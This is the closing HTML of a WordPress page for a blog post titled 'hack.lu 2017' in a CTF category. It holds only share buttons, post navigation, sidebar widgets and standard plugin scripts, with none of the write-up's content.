<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow" data-shared="sharing-twitter-126" class="share-twitter sd-button share-icon" href="https://www.vhn.vn/blog/index.php/2017/10/19/hack-lu-2017/?share=twitter" target="_blank" title="Click to share on Twitter"><span>Twitter</span></a></li><li class="share-facebook"><a rel="nofollow" data-shared="sharing-facebook-126" class="share-facebook sd-button share-icon" href="https://www.vhn.vn/blog/index.php/2017/10/19/hack-lu-2017/?share=facebook" target="_blank" title="Click to share on Facebook"><span>Facebook</span></a></li><li class="share-google-plus-1"><a rel="nofollow" data-shared="sharing-google-126" class="share-google-plus-1 sd-button share-icon" href="https://www.vhn.vn/blog/index.php/2017/10/19/hack-lu-2017/?share=google-plus-1" target="_blank" title="Click to share on Google+"><span>Google</span></a></li><li class="share-linkedin"><a rel="nofollow" data-shared="sharing-linkedin-126" class="share-linkedin sd-button share-icon" href="https://www.vhn.vn/blog/index.php/2017/10/19/hack-lu-2017/?share=linkedin" target="_blank" title="Click to share on LinkedIn"><span>LinkedIn</span></a></li><li class="share-reddit"><a rel="nofollow" data-shared="" class="share-reddit sd-button share-icon" href="https://www.vhn.vn/blog/index.php/2017/10/19/hack-lu-2017/?share=reddit" target="_blank" title="Click to share on Reddit"><span>Reddit</span></a></li><li class="share-pinterest"><a rel="nofollow" data-shared="sharing-pinterest-126" class="share-pinterest sd-button share-icon" href="https://www.vhn.vn/blog/index.php/2017/10/19/hack-lu-2017/?share=pinterest" target="_blank" title="Click to share on Pinterest"><span>Pinterest</span></a></li><li class="share-print"><a rel="nofollow" data-shared="" class="share-print sd-button share-icon" href="https://www.vhn.vn/blog/index.php/2017/10/19/hack-lu-2017/#print" target="_blank" title="Click to print"><span>Print</span></a></li><li class="share-end"></li></ul></div></div></div>
<div id='jp-relatedposts' class='jp-relatedposts' >
	<h3 class="jp-relatedposts-headline"><em>Related</em></h3>
</div>			</div><!-- .entry-content -->

		<footer class="entry-footer">
		<span class="cat-links">Posted in <a href="https://www.vhn.vn/blog/index.php/category/ctf/" rel="category tag">CTF</a></span>	</footer><!-- .entry-footer -->
	</article><!-- #post-## -->

			
	<nav class="navigation post-navigation" role="navigation">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://www.vhn.vn/blog/index.php/2017/07/12/vue-single-file-component-and-typescript/" rel="prev">Vue single file component and typescript</a></div><div class="nav-next"><a href="https://www.vhn.vn/blog/index.php/2017/11/06/hitcon-ctf-2017-quals/" rel="next">HITCON CTF 2017 Quals</a></div></div>
	</nav>
			
<div id="disqus_thread"></div>

		
		</main><!-- #main -->
	</div><!-- #primary -->

	
<div id="secondary" class="widget-area no-toggle" role="complementary">
	<span class="sidebar-close"><i class="fa fa-times"></i></span>
	<aside id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://www.vhn.vn/blog/">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></aside>		<aside id="recent-posts-2" class="widget widget_recent_entries">		<h4 class="widget-title">Recent Posts</h4>		<ul>
											<li>
					<a href="https://www.vhn.vn/blog/index.php/2017/11/06/hitcon-ctf-2017-quals/">HITCON CTF 2017 Quals</a>
									</li>
											<li>
					<a href="https://www.vhn.vn/blog/index.php/2017/10/19/hack-lu-2017/">hack.lu 2017</a>
									</li>
											<li>
					<a href="https://www.vhn.vn/blog/index.php/2017/07/12/vue-single-file-component-and-typescript/">Vue single file component and typescript</a>
									</li>
											<li>
					<a href="https://www.vhn.vn/blog/index.php/2016/03/17/0ctf/">0CTF 2016</a>
									</li>
											<li>
					<a href="https://www.vhn.vn/blog/index.php/2016/03/07/bkpctf-2016/">BKPCTF 2016</a>
									</li>
					</ul>
		</aside><aside id="recent-comments-2" class="widget widget_recent_comments"><h4 class="widget-title">Recent Comments</h4><ul id="recentcomments"><li class="recentcomments"><span class="comment-author-link">Tung Thanh</span> on <a href="https://www.vhn.vn/blog/index.php/2015/11/07/mot-bai-toan-tinh-tong/#comment-3">Một bài toán tính tổng</a></li></ul></aside><aside id="archives-2" class="widget widget_archive"><h4 class="widget-title">Archives</h4>		<ul>
			<li><a href='https://www.vhn.vn/blog/index.php/2017/11/'>November 2017</a></li>
	<li><a href='https://www.vhn.vn/blog/index.php/2017/10/'>October 2017</a></li>
	<li><a href='https://www.vhn.vn/blog/index.php/2017/07/'>July 2017</a></li>
	<li><a href='https://www.vhn.vn/blog/index.php/2016/03/'>March 2016</a></li>
	<li><a href='https://www.vhn.vn/blog/index.php/2015/11/'>November 2015</a></li>
	<li><a href='https://www.vhn.vn/blog/index.php/2015/09/'>September 2015</a></li>
	<li><a href='https://www.vhn.vn/blog/index.php/2015/04/'>April 2015</a></li>
	<li><a href='https://www.vhn.vn/blog/index.php/2015/03/'>March 2015</a></li>
		</ul>
		</aside><aside id="categories-2" class="widget widget_categories"><h4 class="widget-title">Categories</h4>		<ul>
	<li class="cat-item cat-item-2"><a href="https://www.vhn.vn/blog/index.php/category/ctf/" >CTF</a>
</li>
	<li class="cat-item cat-item-3"><a href="https://www.vhn.vn/blog/index.php/category/trick/" >Trick</a>
</li>
	<li class="cat-item cat-item-1"><a href="https://www.vhn.vn/blog/index.php/category/uncategorized/" >Uncategorized</a>
</li>
		</ul>
</aside><aside id="meta-2" class="widget widget_meta"><h4 class="widget-title">Meta</h4>			<ul>
			<li><a href="https://www.vhn.vn/blog/wp-login.php?action=register">Register</a></li>			<li><a href="https://www.vhn.vn/blog/wp-login.php">Log in</a></li>
			<li><a href="https://www.vhn.vn/blog/index.php/feed/">Entries <abbr title="Really Simple Syndication">RSS</abbr></a></li>
			<li><a href="https://www.vhn.vn/blog/index.php/comments/feed/">Comments <abbr title="Really Simple Syndication">RSS</abbr></a></li>
			<li><a href="https://wordpress.org/" title="Powered by WordPress, state-of-the-art semantic personal publishing platform.">WordPress.org</a></li>			</ul>
			</aside></div><!-- #secondary -->

		</div>
	</div><!-- #content -->

	
	<footer id="colophon" class="site-footer" role="contentinfo">
		<div class="site-info container">
			<a href="http://wordpress.org/" rel="nofollow">Proudly powered by WordPress</a><span class="sep"> | </span>Theme: <a href="http://justfreethemes.com/oria" rel="nofollow">Oria</a> by JustFreeThemes.		</div><!-- .site-info -->
	</footer><!-- #colophon -->
</div><!-- #page -->

	<div style="display:none">
	</div>

	<script type="text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/www.vhn.vn\/blog\/index.php\/2017\/10\/19\/hack-lu-2017\/":126};
	</script>
		<link rel='stylesheet' id='su-box-shortcodes-css'  href='https://www.vhn.vn/blog/wp-content/plugins/shortcodes-ultimate/assets/css/box-shortcodes.css?ver=5.0.3' type='text/css' media='all' />
<link rel='stylesheet' id='font-awesome-css'  href='//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css?ver=4.7.0' type='text/css' media='all' />
<script type='text/javascript' src='https://www.vhn.vn/blog/wp-includes/js/jquery/ui/core.min.js?ver=1.11.4'></script>
<script type='text/javascript' src='https://www.vhn.vn/blog/wp-includes/js/jquery/ui/widget.min.js?ver=1.11.4'></script>
<script type='text/javascript' src='https://www.vhn.vn/blog/wp-includes/js/jquery/ui/tabs.min.js?ver=1.11.4'></script>
<script type='text/javascript' src='https://www.vhn.vn/blog/wp-content/plugins/jetpack/_inc/build/photon/photon.min.js?ver=20130122'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var countVars = {"disqusShortname":"vhnvn"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.vhn.vn/blog/wp-content/plugins/disqus-comment-system/public/js/comment_count.js?ver=3.0.16'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var embedVars = {"disqusConfig":{"integration":"wordpress 3.0.16"},"disqusIdentifier":"126 https:\/\/www.vhn.vn\/blog\/?p=126","disqusShortname":"vhnvn","disqusTitle":"hack.lu 2017","disqusUrl":"https:\/\/www.vhn.vn\/blog\/index.php\/2017\/10\/19\/hack-lu-2017\/","postId":"126"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.vhn.vn/blog/wp-content/plugins/disqus-comment-system/public/js/comment_embed.js?ver=3.0.16'></script>
<script type='text/javascript' src='https://s0.wp.com/wp-content/js/devicepx-jetpack.js?ver=201905'></script>
<script type='text/javascript' src='https://www.vhn.vn/blog/wp-content/themes/oria/js/skip-link-focus-fix.js?ver=20130115'></script>
<script type='text/javascript' src='https://www.vhn.vn/blog/wp-includes/js/comment-reply.min.js?ver=4.9.9'></script>
<script type='text/javascript' src='//ajax.googleapis.com/ajax/libs/mootools/1.6.0/mootools.min.js'></script>
<script type='text/javascript' src='https://www.vhn.vn/blog/wp-content/plugins/enlighter/resources/EnlighterJS.min.js?ver=3.6'></script>
<script type='text/javascript' src='https://www.vhn.vn/blog/wp-includes/js/wp-embed.min.js?ver=4.9.9'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var su_other_shortcodes = {"no_preview":"This shortcode doesn't work in live preview. Please insert it into editor and preview on the site."};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.vhn.vn/blog/wp-content/plugins/shortcodes-ultimate/assets/js/other-shortcodes.js?ver=5.0.3'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var sharing_js_options = {"lang":"en","counts":"1"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.vhn.vn/blog/wp-content/plugins/jetpack/_inc/build/sharedaddy/sharing.min.js?ver=6.1.1'></script>
<script type='text/javascript'>
var windowOpen;
			jQuery( document.body ).on( 'click', 'a.share-twitter', function() {
				// If there's another sharing window open, close it.
				if ( 'undefined' !== typeof windowOpen ) {
					windowOpen.close();
				}
				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
				return false;
			});
var windowOpen;
			jQuery( document.body ).on( 'click', 'a.share-facebook', function() {
				// If there's another sharing window open, close it.
				if ( 'undefined' !== typeof windowOpen ) {
					windowOpen.close();
				}
				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
				return false;
			});
var windowOpen;
			jQuery( document.body ).on( 'click', 'a.share-google-plus-1', function() {
				// If there's another sharing window open, close it.
				if ( 'undefined' !== typeof windowOpen ) {
					windowOpen.close();
				}
				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomgoogle-plus-1', 'menubar=1,resizable=1,width=480,height=550' );
				return false;
			});
var windowOpen;
			jQuery( document.body ).on( 'click', 'a.share-linkedin', function() {
				// If there's another sharing window open, close it.
				if ( 'undefined' !== typeof windowOpen ) {
					windowOpen.close();
				}
				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomlinkedin', 'menubar=1,resizable=1,width=580,height=450' );
				return false;
			});
</script>
<script type="text/javascript">/* <![CDATA[ */EnlighterJS_Config = {"selector":{"block":"pre.EnlighterJSRAW","inline":"code.EnlighterJSRAW"},"language":"generic","theme":"enlighter","indent":2,"hover":"hoverEnabled","showLinenumbers":true,"rawButton":true,"infoButton":true,"windowButton":true,"rawcodeDoubleclick":false,"grouping":true,"cryptex":{"enabled":false,"email":"mail@example.tld"}};!function(){var a=function(a){var b="Enlighter Error: ";console.error?console.error(b+a):console.log&&console.log(b+a)};return window.addEvent?"undefined"==typeof EnlighterJS?void a("Javascript Resources not loaded yet!"):"undefined"==typeof EnlighterJS_Config?void a("Configuration not loaded yet!"):void window.addEvent("domready",function(){EnlighterJS.Util.Init(EnlighterJS_Config.selector.block,EnlighterJS_Config.selector.inline,EnlighterJS_Config)}):void a("MooTools Framework not loaded yet!")}();;/* ]]> */</script>
<!-- Shortcodes Ultimate custom CSS - start -->
<style type="text/css">
.su-spoiler-content {
	border-left: 1px dashed #999;
}
</style>
<!-- Shortcodes Ultimate custom CSS - end -->
<script type='text/javascript' src='https://stats.wp.com/e-201905.js' async='async' defer='defer'></script>
<script type='text/javascript'>
	_stq = window._stq || [];
	_stq.push([ 'view', {v:'ext',j:'1:6.1.1',blog:'100285338',post:'126',tz:'7',srv:'www.vhn.vn'} ]);
	_stq.push([ 'clickTrackerInit', '100285338', '126' ]);
</script>

</body>
</html>
